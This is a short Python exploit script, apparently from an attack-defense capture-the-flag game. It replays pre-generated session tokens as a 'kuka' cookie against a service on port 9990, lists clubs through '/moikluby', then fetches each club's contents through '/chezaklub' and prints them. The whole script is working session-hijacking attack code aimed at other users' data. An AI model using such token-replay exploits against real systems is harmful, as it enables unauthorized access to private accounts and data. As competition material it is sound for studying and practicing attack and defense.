#!/usr/bin/env python3

import sys
import requests

ip = sys.argv[1]

host = f'http://{ip}:9990'

oks = []
for i, line in enumerate(open('./session_gen/tokens.txt')):
    if len(oks) > 10 and sum(oks[i - 10:i]) == 0:
        break
    r = requests.get(host + '/moikluby', cookies={'kuka': line.strip()})
    d = r.json()
    if not isinstance(d, list):
        oks.append(0)
        continue
    if len(d) == 1:
        oks.append(0)
        continue
    
    r = requests.get(host + '/chezaklub', params={'клид': d[0]['ид']}, cookies={'kuka': line.strip()})
    print(r.text, flush=True)
    oks.append(1)
    


